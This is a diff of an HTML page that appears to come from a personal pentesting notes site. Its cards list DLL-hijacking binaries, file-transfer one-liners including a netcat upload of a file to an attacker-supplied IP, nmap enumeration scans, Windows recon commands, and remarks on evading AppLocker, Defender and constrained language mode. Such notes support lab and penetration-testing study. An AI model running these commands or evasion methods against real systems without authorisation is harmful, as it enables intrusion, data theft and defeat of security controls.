@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-21T18:21:39 EDT">
+<meta name="revised" content="2019-07-22T21:23:04 EDT">
 <title>Concept :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -608,12 +608,10 @@
 
 <p>Concept</p>
 
-
-
 <ul class="children children-card">
 
 <span><card>
-		<a href="/concepts/dll/" >DLL-Hijacking</a></card>
+        <a href="/concepts/dll/" >DLL-Hijacking</a></card>
 <p>Some binaries that run in syswow64 and have elevated execuation.
 SystemPropertiesComputerName.exe SystemPropertiesHardware.exe SystemPropertiesProtection.exe SystemPropertiesRemote.exe  This website will tell you the dll need for a bianry commonly found in windows most likel x86.
 https://lolbas-project.github.io/
@@ -621,7 +619,7 @@ tzsync /? set COR_ENABLE_PROFILING=1 set | findstr COR  https://github.com/attl4
 </span>
 
 <span><card>
-		<a href="/concepts/file-transfer/" >File Transfer</a></card>
+        <a href="/concepts/file-transfer/" >File Transfer</a></card>
 <p>######## LI/NUX #########
 Python http server
 python3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl
@@ -632,21 +630,21 @@ upload = nc -w 3 [your_ip] 1337 &lt; file.txt listener = nc -lp 1337 &gt; file.<
 </span>
 
 <span><card>
-		<a href="/concepts/linux_enum/" >Linux Enumeration</a></card>
+        <a href="/concepts/linux_enum/" >Linux Enumeration</a></card>
 <p>I always start with nmap i use TCP Connect switch, then move to targeted scans. Then i run a full udp scan. While udp is being scanned. I will then move to gobuster, start manual enumeration. Things to look for are input fields of any kind, look for php parameters/actions in the source.
 nmap
 nmap -sT -p- -T5 -oA nmap/tcpconnect ipaddr nmap -sC -sV -T4 -pport,port,port -oA nmap/targeted ipaddr nmap -sU -p- -T5 -oA nmap/udp ipaddr  Gobuster</p>
 </span>
 
 <span><card>
-		<a href="/concepts/webapppentest/" >WebAppPenTests</a></card>
+        <a href="/concepts/webapppentest/" >WebAppPenTests</a></card>
 <p></p>
 </span>
 
 <span><card>
-		<a href="/concepts/windows_enum/" >Windows</a></card>
+        <a href="/concepts/windows_enum/" >Windows</a></card>
 <p>Shell preferences nishang &lt; nc &lt; winrm / meterpreter
-change password inside powershell.
+whoami /all /priv systeminfo  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
 $password = read-host &quot;Su-ErD;perPa$sw0rd&quot; -assecurestring $useraccount = get-localuser -name &quot;pinkiepie&quot; $useraccount | set-localuser -password $password  os
 https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
 Windows File Type for running commands scripts executables. I found this list looking up applocker policies.
@@ -655,16 +653,11 @@ AppLocker ApplockerFileExtentions
 </span>
 
 <span><card>
-		<a href="/concepts/bypass/" >Windows-Bypass</a></card>
+        <a href="/concepts/bypass/" >Windows-Bypass</a></card>
 <p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
 CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</p>
 </span>
 </ul>
-
-
-
-
-
 
 
 
